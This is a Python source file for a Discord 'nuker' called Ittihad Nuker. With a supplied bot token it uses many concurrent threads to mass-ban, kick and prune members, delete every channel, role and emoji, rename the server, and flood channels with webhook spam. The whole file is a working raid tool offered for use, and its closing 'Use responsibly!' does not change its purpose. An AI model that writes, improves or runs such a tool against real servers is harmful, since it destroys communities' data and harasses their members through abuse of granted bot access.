import requests
import time
import random
import os
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed

class IttihadNukerUltra:
    def __init__(self):
        self.token = None
        self.guild_id = None
        self.session = requests.Session()
        self.session.headers = {
            'Authorization': '',
            'Content-Type': 'application/json'
        }
        self.max_workers = 100
    
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        banner = """
 ██▓▄▄▄█████▓▄▄▄█████▓ ██▓ ██░ ██  ▄▄▄      ▓█████▄     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▓██▒▓  ██▒ ▓▒▓  ██▒ ▓▒▓██▒▓██░ ██▒▒████▄    ▒██▀ ██▌    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒██▒▒ ▓██░ ▒░▒ ▓██░ ▒░▒██▒▒██▀▀██░▒██  ▀█▄  ░██   █▌   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
░██░░ ▓██▓ ░ ░ ▓██▓ ░ ░██░░▓█ ░██ ░██▄▄▄▄██ ░▓█▄   ▌   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░██░  ▒██▒ ░   ▒██▒ ░ ░██░░▓█▒░██▓ ▓█   ▓██▒░▒████▓    ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
░▓    ▒ ░░     ▒ ░░   ░▓   ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒▒▓  ▒    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░    ░        ░     ▒ ░ ▒ ░▒░ ░  ▒   ▒▒ ░ ░ ▒  ▒    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ▒ ░  ░        ░       ▒ ░ ░  ░░ ░  ░   ▒    ░ ░  ░       ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
 ░                     ░   ░  ░  ░      ░  ░   ░                ░    ░     ░  ░      ░  ░   ░                                                                                                                                                                                   
"""
        print("\033[96m" + banner + "\033[0m")
    
    def print_menu(self):
        menu = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                              CONTROL PANEL                                   ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ | \033[94m(1) Ban Members\033[0m      | \033[94m(2) Delete Channels\033[0m    | \033[94m(3) Kick Members\033[0m      |    ║
║ | \033[94m(4) Prune Members\033[0m    | \033[94m(5) Create Channels\033[0m    | \033[94m(6) Spam Channels\033[0m     |    ║
║ | \033[94m(7) Create Roles\033[0m     | \033[94m(8) Delete Roles\033[0m       | \033[94m(9) Delete Emojis\033[0m     |    ║
║ | \033[94m(10) Rename Server\033[0m   | \033[94m(11) Rename Channels\033[0m   | \033[94m(12) Rename Roles\033[0m     |    ║
║ | \033[94m(13) Webhook Spammer\033[0m | \033[94m(14) Credits\033[0m           | \033[94m(15) Exit\033[0m             |    ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        print(menu)
    
    def get_input(self, prompt):
        return input(f"\033[95m╰─➤ {prompt}: \033[0m").strip()
    
    def setup(self):
        self.clear_screen()
        self.print_banner()
        
        print("\033[93mNuker Setup\033[0m")
        print("\033[90m" + "=" * 50 + "\033[0m")
        
        self.token = self.get_input("Enter Bot Token")
        if not self.token.startswith('Bot '):
            self.token = f'Bot {self.token}'
        
        self.guild_id = self.get_input("Enter Server ID")
        
        self.session.headers['Authorization'] = self.token
        
        if not self.check_bot():
            return False
        
        return True
    
    def check_bot(self):
        try:
            r = self.session.get('https://discord.com/api/v9/users/@me')
            if r.status_code == 200:
                bot_data = r.json()
                print(f"\033[92mBot: {bot_data['username']}#{bot_data.get('discriminator', '0000')}\033[0m")
                
                r2 = self.session.get(f'https://discord.com/api/v9/guilds/{self.guild_id}')
                if r2.status_code == 200:
                    server_data = r2.json()
                    print(f"\033[92mServer: {server_data['name']}\033[0m")
                    return True
                else:
                    print(f"\033[91mCannot access server: {r2.status_code}\033[0m")
                    return False
            else:
                print(f"\033[91mInvalid token: {r.status_code}\033[0m")
                return False
        except Exception as e:
            print(f"\033[91mError: {e}\033[0m")
            return False

    def delete_roles(self):
        print("\033[96m DELETING ALL ROLES - ULTRA FAST\033[0m")
        try:
            
            roles = self.session.get(f'https://discord.com/api/v9/guilds/{self.guild_id}/roles').json()
            
            
            roles_to_delete = [role for role in roles if role['name'] != '@everyone' and not role.get('managed', False)]
            
            if not roles_to_delete:
                print("\033[91mNo roles found to delete!\033[0m")
                return
            
            print(f"\033[93mFound {len(roles_to_delete)} roles to delete\033[0m")
            
            def delete_role(role):
                try:
                    
                    r = self.session.delete(f'https://discord.com/api/v9/guilds/{self.guild_id}/roles/{role["id"]}')
                    return role, r.status_code == 204, r.status_code
                except Exception as e:
                    return role, False, str(e)
            
            
            deleted_count = 0
            failed_count = 0
            
            with ThreadPoolExecutor(max_workers=min(len(roles_to_delete), 100)) as executor:
                
                future_to_role = {executor.submit(delete_role, role): role for role in roles_to_delete}
                
                for future in as_completed(future_to_role):
                    role, success, status = future.result()
                    if success:
                        deleted_count += 1
                        print(f"\033[92m Deleted role: {role['name']}\033[0m")
                    else:
                        failed_count += 1
                        print(f"\033[91m Failed to delete: {role['name']} (Status: {status})\033[0m")
            
            print(f"\033[92m DELETE COMPLETE: {deleted_count}/{len(roles_to_delete)} roles deleted\033[0m")
            if failed_count > 0:
                print(f"\033[91mFailed to delete {failed_count} roles\033[0m")
                
            
            remaining_roles = self.session.get(f'https://discord.com/api/v9/guilds/{self.guild_id}/roles').json()
            remaining_count = len([r for r in remaining_roles if r['name'] != '@everyone' and not r.get('managed', False)])
            print(f"\033[93mRemaining roles: {remaining_count}\033[0m")
            
        except Exception as e:
            print(f"\033[91mError: {e}\033[0m")

    def create_channels(self):
        print("\033[96m CREATING CHANNELS\033[0m")
        try:
            channel_name = self.get_input("Enter channel name")
            num_channels = int(self.get_input("How many channels to create"))
            
            print(f"\033[93mCreating {num_channels} channels\033[0m")
            
            def create_channel(i):
                try:
                    session = requests.Session()
                    session.headers.update({'Authorization': self.token, 'Content-Type': 'application/json'})
                    data = {'name': f'{channel_name}', 'type': 0}
                    r = session.post(f'https://discord.com/api/v9/guilds/{self.guild_id}/channels', json=data)
                    return i, r.status_code in [200, 201]
                except:
                    return i, False
            
            with ThreadPoolExecutor(max_workers=min(num_channels, 50)) as executor:
                futures = [executor.submit(create_channel, i) for i in range(num_channels)]
                
                created_count = 0
                for future in as_completed(futures):
                    i, success = future.result()
                    if success:
                        created_count += 1
                        print(f"\033[92m Created channel: {channel_name}\033[0m")
            
            print(f"\033[92m CREATE COMPLETE: {created_count}/{num_channels} channels\033[0m")
            
        except Exception as e:
            print(f"\033[91mError: {e}\033[0m")

    def create_roles(self):
        print("\033[96m CREATING ROLES\033[0m")
        try:
            role_name = self.get_input("Enter role name")
            num_roles = int(self.get_input("How many roles to create"))
            
            print(f"\033[93mCreating {num_roles} roles\033[0m")
            
            def create_role(i):
                try:
                    session = requests.Session()
                    session.headers.update({'Authorization': self.token, 'Content-Type': 'application/json'})
                    data = {
                        'name': f'{role_name}',
                        'color': random.randint(0, 0xFFFFFF)
                    }
                    r = session.post(f'https://discord.com/api/v9/guilds/{self.guild_id}/roles', json=data)
                    return i, r.status_code in [200, 201]
                except:
                    return i, False
            
            with ThreadPoolExecutor(max_workers=min(num_roles, 50)) as executor:
                futures = [executor.submit(create_role, i) for i in range(num_roles)]
                
                created_count = 0
                for future in as_completed(futures):
                    i, success = future.result()
                    if success:
                        created_count += 1
                        print(f"\033[92m Created role: {role_name}\033[0m")
            
            print(f"\033[92m CREATE COMPLETE: {created_count}/{num_roles} roles\033[0m")
            
        except Exception as e:
            print(f"\033[91mError: {e}\033[0m")

    def delete_channels(self):
        print("\033[96m ELETING ALL CHANNELS\033[0m")
        try:
            channels = self.session.get(f'https://discord.com/api/v9/guilds/{self.guild_id}/channels').json()
            
            if not channels:
                print("\033[91mNo channels found!\033[0m")
                return
            
            print(f"\033[93mFound {len(channels)} channels to delete\033[0m")
            
            def delete_channel(channel):
                try:
                    session = requests.Session()
                    session.headers.update({'Authorization': self.token, 'Content-Type': 'application/json'})
                    r = session.delete(f'https://discord.com/api/v9/channels/{channel["id"]}')
                    return channel, r.status_code == 200
                except:
                    return channel, False
            
            with ThreadPoolExecutor(max_workers=min(len(channels), 50)) as executor:
                futures = [executor.submit(delete_channel, channel) for channel in channels]
                
                deleted_count = 0
                for future in as_completed(futures):
                    channel, success = future.result()
                    if success:
                        deleted_count += 1
                        print(f"\033[92m Deleted: {channel.get('name', 'Unknown')}\033[0m")
            
            print(f"\033[92m DELETE COMPLETE: {deleted_count}/{len(channels)} channels\033[0m")
            
        except Exception as e:
            print(f"\033[91mError: {e}\033[0m")

    def ban_members(self):
        print("\033[96m BANNING MEMBERS\033[0m")
        try:
            members = self.session.get(f'https://discord.com/api/v9/guilds/{self.guild_id}/members?limit=1000').json()
            
            if not members:
                print("\033[91mNo members found!\033[0m")
                return
            
            print(f"\033[93mBanning {len(members)} members\033[0m")
            
            def ban_member(member):
                if 'user' in member:
                    try:
                        session = requests.Session()
                        session.headers.update({'Authorization': self.token, 'Content-Type': 'application/json'})
                        user_id = member['user']['id']
                        r = session.put(f'https://discord.com/api/v9/guilds/{self.guild_id}/bans/{user_id}')
                        return member, r.status_code == 200
                    except:
                        return member, False
                return member, False
            
            with ThreadPoolExecutor(max_workers=min(len(members), 50)) as executor:
                futures = [executor.submit(ban_member, member) for member in members]
                
                banned_count = 0
                for future in as_completed(futures):
                    member, success = future.result()
                    if success:
                        banned_count += 1
                        print(f"\033[92m Banned: {member['user']['username']}\033[0m")
            
            print(f"\033[92m BAN COMPLETE: {banned_count}/{len(members)} members\033[0m")
            
        except Exception as e:
            print(f"\033[91mError: {e}\033[0m")

    def kick_members(self):
        print("\033[96m KICKING MEMBERS\033[0m")
        try:
            members = self.session.get(f'https://discord.com/api/v9/guilds/{self.guild_id}/members?limit=1000').json()
            
            if not members:
                print("\033[91mNo members found!\033[0m")
                return
            
            print(f"\033[93mKicking {len(members)} members\033[0m")
            
            def kick_member(member):
                if 'user' in member:
                    try:
                        session = requests.Session()
                        session.headers.update({'Authorization': self.token, 'Content-Type': 'application/json'})
                        user_id = member['user']['id']
                        r = session.delete(f'https://discord.com/api/v9/guilds/{self.guild_id}/members/{user_id}')
                        return member, r.status_code == 204
                    except:
                        return member, False
                return member, False
            
            with ThreadPoolExecutor(max_workers=min(len(members), 50)) as executor:
                futures = [executor.submit(kick_member, member) for member in members]
                
                kicked_count = 0
                for future in as_completed(futures):
                    member, success = future.result()
                    if success:
                        kicked_count += 1
                        print(f"\033[92mKicked: {member['user']['username']}\033[0m")
            
            print(f"\033[92m KICK COMPLETE: {kicked_count}/{len(members)} members\033[0m")
            
        except Exception as e:
            print(f"\033[91mError: {e}\033[0m")

    def delete_emojis(self):
        print("\033[96m🔥 DELETING EMOJIS\033[0m")
        try:
            emojis = self.session.get(f'https://discord.com/api/v9/guilds/{self.guild_id}/emojis').json()
            
            if not emojis:
                print("\033[91mNo emojis found!\033[0m")
                return
            
            print(f"\033[93mDeleting {len(emojis)} emojis\033[0m")
            
            def delete_emoji(emoji):
                try:
                    session = requests.Session()
                    session.headers.update({'Authorization': self.token, 'Content-Type': 'application/json'})
                    r = session.delete(f'https://discord.com/api/v9/guilds/{self.guild_id}/emojis/{emoji["id"]}')
                    return emoji, r.status_code == 204
                except:
                    return emoji, False
            
            with ThreadPoolExecutor(max_workers=min(len(emojis), 50)) as executor:
                futures = [executor.submit(delete_emoji, emoji) for emoji in emojis]
                
                deleted_count = 0
                for future in as_completed(futures):
                    emoji, success = future.result()
                    if success:
                        deleted_count += 1
                        print(f"\033[92m Deleted emoji: {emoji['name']}\033[0m")
            
            print(f"\033[92m🔥 DELETE COMPLETE: {deleted_count}/{len(emojis)} emojis\033[0m")
            
        except Exception as e:
            print(f"\033[91mError: {e}\033[0m")

    def rename_channels(self):
        print("\033[96m RENAMING CHANNELS\033[0m")
        try:
            new_name = self.get_input("Enter new channel name")
            channels = self.session.get(f'https://discord.com/api/v9/guilds/{self.guild_id}/channels').json()
            
            if not channels:
                print("\033[91mNo channels found!\033[0m")
                return
            
            print(f"\033[93mRenaming {len(channels)} channels\033[0m")
            
            def rename_channel(channel):
                try:
                    session = requests.Session()
                    session.headers.update({'Authorization': self.token, 'Content-Type': 'application/json'})
                    data = {'name': f'{new_name}'}
                    r = session.patch(f'https://discord.com/api/v9/channels/{channel["id"]}', json=data)
                    return channel, r.status_code == 200
                except:
                    return channel, False
            
            with ThreadPoolExecutor(max_workers=min(len(channels), 50)) as executor:
                futures = [executor.submit(rename_channel, channel) for channel in channels]
                
                renamed_count = 0
                for future in as_completed(futures):
                    channel, success = future.result()
                    if success:
                        renamed_count += 1
                        print(f"\033[92mRenamed channel\033[0m")
            
            print(f"\033[92m🔥 RENAME COMPLETE: {renamed_count}/{len(channels)} channels\033[0m")
            
        except Exception as e:
            print(f"\033[91mError: {e}\033[0m")

    def rename_roles(self):
        print("\033[96m RENAMING ROLES\033[0m")
        try:
            new_name = self.get_input("Enter new role name")
            roles = self.session.get(f'https://discord.com/api/v9/guilds/{self.guild_id}/roles').json()
            
            roles_to_rename = [role for role in roles if role['name'] != '@everyone']
            
            if not roles_to_rename:
                print("\033[91mNo roles found!\033[0m")
                return
            
            print(f"\033[93mRenaming {len(roles_to_rename)} roles\033[0m")
            
            def rename_role(role):
                try:
                    session = requests.Session()
                    session.headers.update({'Authorization': self.token, 'Content-Type': 'application/json'})
                    data = {'name': f'{new_name}'}
                    r = session.patch(f'https://discord.com/api/v9/guilds/{self.guild_id}/roles/{role["id"]}', json=data)
                    return role, r.status_code == 200
                except:
                    return role, False
            
            with ThreadPoolExecutor(max_workers=min(len(roles_to_rename), 50)) as executor:
                futures = [executor.submit(rename_role, role) for role in roles_to_rename]
                
                renamed_count = 0
                for future in as_completed(futures):
                    role, success = future.result()
                    if success:
                        renamed_count += 1
                        print(f"\033[92m Renamed role\033[0m")
            
            print(f"\033[92m RENAME COMPLETE: {renamed_count}/{len(roles_to_rename)} roles\033[0m")
            
        except Exception as e:
            print(f"\033[91mError: {e}\033[0m")

    def webhook_spammer(self):
        print("\033[96mWEBHOOK SPAMMER\033[0m")
        try:
            channels = self.session.get(f'https://discord.com/api/v9/guilds/{self.guild_id}/channels').json()
            text_channels = [ch for ch in channels if ch['type'] == 0]
            
            if not text_channels:
                print("\033[91mNo text channels found!\033[0m")
                return
            
            message = self.get_input("Enter message to spam")
            spam_count = int(self.get_input("How many times to spam each webhook"))
            
            webhooks = []
            
            print(f"\033[93mCreating webhooks in {len(text_channels)} channels\033[0m")
            for channel in text_channels:
                try:
                    webhook_data = {'name': 'Ittihad-Spam'}
                    response = self.session.post(f'https://discord.com/api/v9/channels/{channel["id"]}/webhooks', json=webhook_data)
                    if response.status_code == 200:
                        webhook = response.json()
                        webhooks.append(webhook['url'])
                        print(f"\033[92m Created webhook in: {channel['name']}\033[0m")
                except:
                    continue
            
            print(f"\033[93mCreated {len(webhooks)} webhooks\033[0m")
            
            print(f"\033[93mSpamming {spam_count} messages through {len(webhooks)} webhooks\033[0m")
            
            def spam_message(webhook_url, i):
                try:
                    data = {'content': f"{message}"}
                    response = requests.post(webhook_url, json=data, timeout=2)
                    return response.status_code == 200
                except:
                    return False
            
            total_messages = len(webhooks) * spam_count
            sent_count = 0
            
            for i in range(spam_count):
                with ThreadPoolExecutor(max_workers=50) as executor:
                    futures = [executor.submit(spam_message, webhook_url, i) for webhook_url in webhooks]
                    
                    for future in as_completed(futures):
                        if future.result():
                            sent_count += 1
                
                print(f"\033[92mSent batch {i+1}/{spam_count}\033[0m")
            
            print(f"\033[92m SPAM COMPLETE: {sent_count}/{total_messages} messages sent\033[0m")
            
        except Exception as e:
            print(f"\033[91mError: {e}\033[0m")

    def prune_members(self):
        print("\033[96mPRUNING MEMBERS\033[0m")
        try:
            data = {'days': 7}
            r = self.session.post(f'https://discord.com/api/v9/guilds/{self.guild_id}/prune', json=data)
            if r.status_code == 200:
                result = r.json()
                print(f"\033[92mPruned {result.get('pruned', 0)} members\033[0m")
            else:
                print(f"\033[91mPrune failed: {r.status_code}\033[0m")
        except Exception as e:
            print(f"\033[91mError: {e}\033[0m")

    def rename_server(self):
        print("\033[96mRENAMING SERVER\033[0m")
        try:
            new_name = self.get_input("Enter new server name")
            data = {'name': new_name}
            r = self.session.patch(f'https://discord.com/api/v9/guilds/{self.guild_id}', json=data)
            if r.status_code == 200:
                print(f"\033[92mServer renamed to: {new_name}\033[0m")
            else:
                print(f"\033[91mRename failed: {r.status_code}\033[0m")
        except Exception as e:
            print(f"\033[91mError: {e}\033[0m")

    def credits(self):
        print("\033[96mCREDITS\033[0m")
        print("\033[90m" + "=" * 50 + "\033[0m")
        print("\033[94mIttihad Nuker 1.0v\033[0m")
        print("\033[93mDeveloped by: PR\033[0m")
        print("\033[95mContact: discord.gg/Ittihad\033[0m")
        print("\033[91mUse responsibly!\033[0m")

    def run(self):
        if not self.setup():
            input("\nPress Enter to exit...")
            return
        
        while True:
            self.clear_screen()
            self.print_banner()
            self.print_menu()
            
            choice = self.get_input("Select option [1-15]")
            
            if choice == '1':
                self.ban_members()
            elif choice == '2':
                self.delete_channels()
            elif choice == '3':
                self.kick_members()
            elif choice == '4':
                self.prune_members()
            elif choice == '5':
                self.create_channels()
            elif choice == '6':
                self.create_channels()
            elif choice == '7':
                self.create_roles()
            elif choice == '8':
                self.delete_roles()
            elif choice == '9':
                self.delete_emojis()
            elif choice == '10':
                self.rename_server()
            elif choice == '11':
                self.rename_channels()
            elif choice == '12':
                self.rename_roles()
            elif choice == '13':
                self.webhook_spammer()
            elif choice == '14':
                self.credits()
            elif choice == '15':
                print("\033[93mExiting Ittihad Nuker...\033[0m")
                break
            else:
                print("\033[91mInvalid option! Please choose 1-15\033[0m")
            
            input("\nPress Enter to continue...")

if __name__ == "__main__":
    try:
        if os.name == 'nt':
            os.system('color 0F')
        
        nuker = IttihadNukerUltra()
        nuker.run()
    except KeyboardInterrupt:
        print("\n\033[93mProgram interrupted by user\033[0m")
    except Exception as e:
        print(f"\n\033[91mCritical error: {e}\033[0m")
    finally:
        input("Press Enter to exit...")
